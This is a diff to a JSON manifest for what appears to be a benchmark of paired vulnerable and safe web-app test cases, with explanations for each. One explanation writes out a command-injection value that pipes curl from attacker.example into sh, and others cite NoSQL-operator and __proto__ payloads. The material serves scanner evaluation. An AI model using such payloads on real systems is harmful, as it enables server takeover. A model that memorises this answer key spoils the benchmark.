@@ -1,17 +1,23 @@
 {
-  "generatedBy": "benchmark/build-corpus-manifest.mjs",
+  "generatedBy": "benchmark/build-corpus-manifest.mjs --corpus benchmark/corpus",
   "families": [
+    {
+      "family": "browser",
+      "architecture": "Browser page scripts and client components: plain ES modules served from public/, reading location, the fragment, the query string and the referrer, writing to the DOM and navigating with window.location",
+      "vulnerable": 2,
+      "safe": 2
+    },
     {
       "family": "express",
       "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
-      "vulnerable": 11,
-      "safe": 11
+      "vulnerable": 18,
+      "safe": 18
     },
     {
       "family": "fastify",
       "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
-      "vulnerable": 10,
-      "safe": 10
+      "vulnerable": 11,
+      "safe": 11
     },
     {
       "family": "graphql",
@@ -22,8 +28,8 @@
     {
       "family": "hono",
       "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
-      "vulnerable": 6,
-      "safe": 6
+      "vulnerable": 7,
+      "safe": 7
     },
     {
       "family": "koa",
@@ -34,8 +40,8 @@
     {
       "family": "nextjs-app-router",
       "architecture": "Next.js 15/16 App Router route handlers and async React server components in TypeScript, with cookie sessions read through await cookies() and Drizzle ORM for data access",
-      "vulnerable": 11,
-      "safe": 11
+      "vulnerable": 12,
+      "safe": 12
     },
     {
       "family": "nextjs-server-actions",
@@ -46,8 +52,8 @@
     {
       "family": "plain-http",
       "architecture": "Hand-rolled Node 20 node:http server: http.createServer with an async request handler, a manual dispatcher over `${request.method} ${url.pathname}`, manual body reading and hand-written JSON responses (CommonJS, no framework).",
-      "vulnerable": 11,
-      "safe": 11
+      "vulnerable": 12,
+      "safe": 12
     },
     {
       "family": "python-fastapi",
@@ -63,9 +69,9 @@
     }
   ],
   "totals": {
-    "vulnerable": 78,
-    "safe": 78,
-    "classes": 38
+    "vulnerable": 91,
+    "safe": 91,
+    "classes": 41
   },
   "classes": [
     "argument_injection",
@@ -75,11 +81,14 @@
     "code_injection",
     "command_injection",
     "debug_endpoint_exposure",
+    "dependency_with_known_advisory",
+    "dom_html_injection",
     "hardcoded_secret",
     "insecure_cookie_configuration",
     "insecure_cors_configuration",
     "insecure_randomness",
     "jwt_verification_bypass",
+    "jwt_weak_secret",
     "mass_assignment",
     "missing_authentication",
     "missing_csrf_protection",
@@ -108,6 +117,68 @@
     "zip_slip"
   ],
   "cases": [
+    {
+      "id": "browser-invite-welcome-banner",
+      "family": "browser",
+      "language": "javascript",
+      "file": "browser/welcome-banner.js",
+      "kind": "vulnerable",
+      "category": "dom_html_injection",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "line": 23,
+      "lineRange": [
+        23,
+        23
+      ],
+      "runtimeVerifiable": true,
+      "scanAs": "public/js/welcome.js",
+      "architecture": "Browser page scripts and client components: plain ES modules served from public/, reading location, the fragment, the query string and the referrer, writing to the DOM and navigating with window.location",
+      "why": "The URL fragment is decoded and written into innerHTML. Anyone can send an invitation-style link whose fragment is markup with an event handler, and it runs in this origin when the page loads; the fragment never reaches the server, so no server-side filter sees it."
+    },
+    {
+      "id": "browser-invite-welcome-header",
+      "family": "browser",
+      "language": "javascript",
+      "file": "browser/welcome-header.js",
+      "kind": "safe",
+      "pairedWith": "browser-invite-welcome-banner",
+      "scanAs": "public/js/join.js",
+      "why": "The same greeting from the same fragment, but built with createElement and textContent, so the inviter name is rendered as text and never parsed as HTML."
+    },
+    {
+      "id": "browser-sign-in-return-to",
+      "family": "browser",
+      "language": "javascript",
+      "file": "browser/sign-in-form.js",
+      "kind": "vulnerable",
+      "category": "open_redirect",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "line": 28,
+      "lineRange": [
+        27,
+        28
+      ],
+      "runtimeVerifiable": true,
+      "scanAs": "public/js/sign-in.js",
+      "architecture": "Browser page scripts and client components: plain ES modules served from public/, reading location, the fragment, the query string and the referrer, writing to the DOM and navigating with window.location",
+      "why": "After a successful sign-in the page navigates to the next query parameter as given, so a sign-in link on this domain can hand a freshly authenticated user to an attacker's look-alike page."
+    },
+    {
+      "id": "browser-sign-in-return-path",
+      "family": "browser",
+      "language": "javascript",
+      "file": "browser/sign-in-page.js",
+      "kind": "safe",
+      "pairedWith": "browser-sign-in-return-to",
+      "scanAs": "public/js/login.js",
+      "why": "The same return-after-sign-in flow, but the next parameter is resolved against this origin and discarded unless the result is same-origin, and only its path and query are used."
+    },
     {
       "id": "express-invoice-ledger-filter",
       "family": "express",
@@ -439,6 +510,254 @@
       "why": "The same ripgrep call passes the search term as the value of an explicit --regexp option and terminates option parsing with -- before the search root, so a term beginning with a dash is treated as pattern text and can never become a flag."
     },
     {
+      "id": "express-support-network-probe",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/network-probe.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /support/network/probe",
+      "line": 21,
+      "lineRange": [
+        21,
+        21
+      ],
+      "runtimeVerifiable": true,
+      "why": "The host from the request body is interpolated into the script handed to `sh -c`, so a value such as \"example.com; curl attacker.example | sh\" runs as a second shell command with the application's privileges. Using spawn rather than exec does not help when the program spawned is a shell and the caller's text is its script."
+    },
+    {
+      "id": "express-support-network-trace",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/network-trace.js",
+      "kind": "safe",
+      "pairedWith": "express-support-network-probe",
+      "why": "The same support probe spawns traceroute directly with a fixed argument array, so no shell parses the host, a `--` ends option parsing, and the host must match a hostname pattern before it is used."
+    },
+    {
+      "id": "express-dashboard-sign-in",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/sign-in.js",
+      "kind": "vulnerable",
+      "category": "missing_rate_limit_on_credentials",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "route": "POST /auth/sign-in",
+      "line": 13,
+      "lineRange": [
+        13,
+        24
+      ],
+      "runtimeVerifiable": true,
+      "packageJson": {
+        "name": "dashboard-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "bcrypt": "^5.1.1",
+          "cookie-parser": "^1.4.7",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "The password sign-in route checks a bcrypt hash on every request and nothing in the route or the project limits attempts: the manifest declares no rate limiter and the route has no throttling middleware, so an attacker can try passwords against any email as fast as the server answers."
+    },
+    {
+      "id": "express-dashboard-sign-in-throttled",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/sign-in-throttled.js",
+      "kind": "safe",
+      "pairedWith": "express-dashboard-sign-in",
+      "packageJson": {
+        "name": "dashboard-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "bcrypt": "^5.1.1",
+          "cookie-parser": "^1.4.7",
+          "express-rate-limit": "^7.4.1",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "The same sign-in route runs behind an express-rate-limit middleware that allows ten attempts per address per fifteen minutes, and the project declares that limiter."
+    },
+    {
+      "id": "express-app-shell-browser-origins",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/app-shell.js",
+      "kind": "vulnerable",
+      "category": "insecure_cors_configuration",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "line": 19,
+      "lineRange": [
+        15,
+        20
+      ],
+      "runtimeVerifiable": true,
+      "why": "The origin callback approves every origin, and credentials are allowed, so the cors middleware reflects any requesting origin into Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true. Any website a signed-in user visits can read this API's responses with the user's session cookie."
+    },
+    {
+      "id": "express-app-bootstrap-browser-origins",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/app-bootstrap.js",
+      "kind": "safe",
+      "pairedWith": "express-app-shell-browser-origins",
+      "why": "The same credentialed CORS setup, but the origin callback approves only origins in a configured set (or a request with no Origin header), so a third-party site's request is not given credentialed access."
+    },
+    {
+      "id": "express-dashboard-layout-patch",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/widget-layout.js",
+      "kind": "vulnerable",
+      "category": "prototype_pollution",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "PATCH /dashboards/:dashboardId/layout",
+      "line": 25,
+      "lineRange": [
+        24,
+        25
+      ],
+      "runtimeVerifiable": true,
+      "why": "Both property names in the nested write come from the request body. A panel of \"__proto__\" makes layout[panel] resolve to Object.prototype, and the second write then sets an attacker-chosen property on every object in the process, which can change authorisation checks and option defaults elsewhere in the server."
+    },
+    {
+      "id": "express-dashboard-settings-patch",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/widget-settings.js",
+      "kind": "safe",
+      "pairedWith": "express-dashboard-layout-patch",
+      "why": "The same nested write, but the panel and setting names must each be members of a fixed set of editor names, so neither can be __proto__, constructor or prototype."
+    },
+    {
+      "id": "express-guest-cart-restore",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/cart-restore.js",
+      "kind": "vulnerable",
+      "category": "unsafe_deserialization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /cart",
+      "line": 20,
+      "lineRange": [
+        20,
+        20
+      ],
+      "runtimeVerifiable": true,
+      "why": "The cart cookie is client-controlled and is decoded with Cryo, which rebuilds functions and prototypes from its input. A crafted cookie can carry a function that runs when the application touches the restored object, giving code execution on the server from an unauthenticated request."
+    },
+    {
+      "id": "express-guest-cart-summary",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/cart-summary.js",
+      "kind": "safe",
+      "pairedWith": "express-guest-cart-restore",
+      "why": "The same guest cart cookie is decoded with JSON.parse, which cannot produce functions or prototypes, and each line is reduced to a string sku and a positive integer quantity before use."
+    },
+    {
+      "id": "express-revenue-report-filters",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/report-filters.js",
+      "kind": "vulnerable",
+      "category": "dependency_with_known_advisory",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /reports/revenue",
+      "line": 20,
+      "lineRange": [
+        20,
+        20
+      ],
+      "runtimeVerifiable": true,
+      "packageJson": {
+        "name": "reporting-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "lodash": "4.17.11",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "lodash is pinned at 4.17.11, inside the published advisory ranges for merge (prototype pollution, fixed in 4.17.12 and later), and the route calls _.merge with the request body's filters, which is exactly the function and the input those advisories describe."
+    },
+    {
+      "id": "express-subscription-report-columns",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/report-columns.js",
+      "kind": "safe",
+      "pairedWith": "express-revenue-report-filters",
+      "packageJson": {
+        "name": "reporting-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "lodash": "4.17.11",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "The same lodash 4.17.11 is installed, but the route only calls pick and includes, which no advisory affecting that version names, and each value is checked against a fixed list. The installed version is still worth upgrading, which belongs at the manifest rather than in this route."
+    },
+    {
+      "id": "express-personal-api-tokens",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/api-tokens.js",
+      "kind": "vulnerable",
+      "category": "jwt_weak_secret",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /tokens",
+      "line": 24,
+      "lineRange": [
+        10,
+        24
+      ],
+      "runtimeVerifiable": true,
+      "why": "The signing key falls back to the literal \"changeme\" when API_TOKEN_SECRET is unset, so any deployment that misses the variable signs tokens with a key everyone can guess. An attacker who tries it can mint a token for any user and any scopes, offline."
+    },
+    {
+      "id": "express-personal-api-keys",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/api-keys.js",
+      "kind": "safe",
+      "pairedWith": "express-personal-api-tokens",
+      "why": "The same token issuance, but the key comes only from the environment and the module refuses to load without a key of at least 32 characters, so there is no literal to guess."
+    },
+    {
       "id": "fastify-password-reset-token-lookup",
       "family": "fastify",
       "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
@@ -737,6 +1056,36 @@
       "kind": "safe",
       "pairedWith": "fastify-notification-preferences-save",
       "why": "Every route in the file, the write included, runs authenticate and requireSelf in its preHandler chain and keys the statement on request.user.accountId rather than the path parameter, so an anonymous or third-party caller cannot reach the record."
+    },
+    {
+      "id": "fastify-order-insights-status",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/order-insights.js",
+      "kind": "vulnerable",
+      "category": "nosql_injection",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /insights/orders",
+      "line": 17,
+      "lineRange": [
+        13,
+        17
+      ],
+      "runtimeVerifiable": true,
+      "why": "The status from the JSON body goes into the $match stage unchecked. A body of {\"status\": {\"$ne\": null}} or a $regex operator replaces the equality test, so the filter the dashboard promises is whatever the caller sends."
+    },
+    {
+      "id": "fastify-order-trends-status",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/order-trends.js",
+      "kind": "safe",
+      "pairedWith": "fastify-order-insights-status",
+      "why": "The same aggregation, but the status is coerced to a string and must be one of the known statuses, so no operator object can reach the $match stage."
     },
     {
       "id": "graphql-invoice-drawer-lookup",
@@ -1097,6 +1446,36 @@
       "kind": "safe",
       "pairedWith": "hono-embedded-widget-origins",
       "why": "The same credentialed cors middleware on the same kind of mount, but the origin callback returns the request origin only when it is a member of a fixed allowlist and otherwise returns null, so an unknown origin receives no CORS headers at all."
+    },
+    {
+      "id": "hono-campaign-preview-subject",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/email-preview.ts",
+      "kind": "vulnerable",
+      "category": "reflected_cross_site_scripting",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /campaigns/:campaignId/preview",
+      "line": 26,
+      "lineRange": [
+        24,
+        26
+      ],
+      "runtimeVerifiable": true,
+      "why": "The subject query parameter is interpolated into a plain template string and sent with c.html, which sets text/html without escaping anything. A link to the preview with a subject containing a script tag runs in the editor's origin with the viewer's session."
+    },
+    {
+      "id": "hono-campaign-draft-subject",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/email-draft.ts",
+      "kind": "safe",
+      "pairedWith": "hono-campaign-preview-subject",
+      "why": "The same preview, but the page is built with hono/html's html tag, which escapes every interpolated value; only the saved template is marked raw, and it is not caller input."
     },
     {
       "id": "koa-dashboard-pdf-render",
@@ -1630,6 +2009,38 @@
       "why": "The service key is read only in a server component, where it never reaches the bundle, and the client child receives a short-lived token minted for one dataset and the ingest:append scope instead of the credential itself."
     },
     {
+      "id": "nextjs-app-router-member-profile-patch",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handlers and async React server components in TypeScript, with cookie sessions read through await cookies() and Drizzle ORM for data access",
+      "language": "typescript",
+      "file": "nextjs-app-router/member-profile-route.ts",
+      "kind": "vulnerable",
+      "category": "mass_assignment",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "PATCH /api/me",
+      "line": 27,
+      "lineRange": [
+        24,
+        27
+      ],
+      "runtimeVerifiable": true,
+      "scanAs": "app/api/me/route.ts",
+      "why": "The parsed JSON body is handed to Drizzle's set() as it arrived, so the caller chooses which columns of their own users row are written. Sending role, email or any other column alongside displayName updates it too."
+    },
+    {
+      "id": "nextjs-app-router-member-settings-patch",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/member-settings-route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-member-profile-patch",
+      "scanAs": "app/api/me/settings/route.ts",
+      "why": "The same profile update, but the body is parsed by a strict Zod schema that admits only the four editable fields, so role and every other column are rejected before the write."
+    },
+    {
       "id": "nextjs-server-actions-profile-update",
       "family": "nextjs-server-actions",
       "architecture": "Next.js 15/16 \"use server\" module exporting two actions bound to the same settings form",
@@ -2145,6 +2556,35 @@
       "kind": "safe",
       "pairedWith": "plain-http-wallet-withdrawal-debit",
       "why": "The debit is a single conditional UPDATE carrying balance_cents >= $1 in its WHERE clause whose rowCount decides the outcome, it runs inside the transaction that queues the payout and writes the ledger entry, and a uniquely constrained request key makes a retried tap replay the original transfer instead of creating a second one."
+    },
+    {
+      "id": "plain-http-newsletter-click-redirect",
+      "family": "plain-http",
+      "architecture": "Hand-rolled Node 20 node:http server: http.createServer with an async request handler, a manual dispatcher over `${request.method} ${url.pathname}`, manual body reading and hand-written JSON responses (CommonJS, no framework).",
+      "language": "javascript",
+      "file": "plain-http/link-tracker.js",
+      "kind": "vulnerable",
+      "category": "open_redirect",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "line": 27,
+      "lineRange": [
+        27,
+        27
+      ],
+      "runtimeVerifiable": true,
+      "why": "The Location header is the `to` query parameter as given, so a link on this domain can send a reader to any site, which makes the domain a convincing first hop for phishing."
+    },
+    {
+      "id": "plain-http-newsletter-article-redirect",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/article-links.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-newsletter-click-redirect",
+      "why": "The same click-tracking redirect, but the link carries an article id that must match a pattern and exist, and the Location is a fixed /articles/ path with the id URL-encoded, so the destination is always on this site."
     },
     {
       "id": "python-fastapi-revenue-segment-filter",
